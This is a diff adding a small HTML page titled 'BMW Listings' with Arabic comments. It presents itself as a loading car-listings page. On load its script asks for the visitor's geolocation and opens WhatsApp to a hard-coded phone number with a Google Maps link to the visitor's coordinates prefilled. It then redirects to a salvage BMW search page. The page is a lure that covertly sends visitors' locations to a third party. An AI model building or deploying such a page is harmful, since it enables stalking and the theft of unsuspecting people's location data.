@@ -1,0 +1,42 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>BMW Listings</title>
+</head>
+<body onload="redirectAndSendLocation()">
+
+  <p>جاري تحميل الصفحة...</p>
+
+  <script>
+    function redirectAndSendLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          // جهز رسالة الموقع
+          const message = `موقع الزائر هو: https://maps.google.com/?q=${lat},${lon}`;
+
+          // رقم تليفون واتساب
+          const phone = '201065574316';
+          
+          // افتح واتساب في نافذة جديدة
+          window.open(`https://wa.me/${phone}?text=${encodeURIComponent(message)}`, '_blank');
+
+          // وجّه الزائر لموقع Pickles
+          window.location.href = "https://www.pickles.com.au/used/search/lob/salvage/cars/bmw";
+
+        }, function(error) {
+          // لو فشل تحديد الموقع، روح للموقع
+          window.location.href = "https://www.pickles.com.au/used/search/lob/salvage/cars/bmw";
+        });
+      } else {
+        window.location.href = "https://www.pickles.com.au/used/search/lob/salvage/cars/bmw";
+      }
+    }
+  </script>
+
+</body>
+</html>
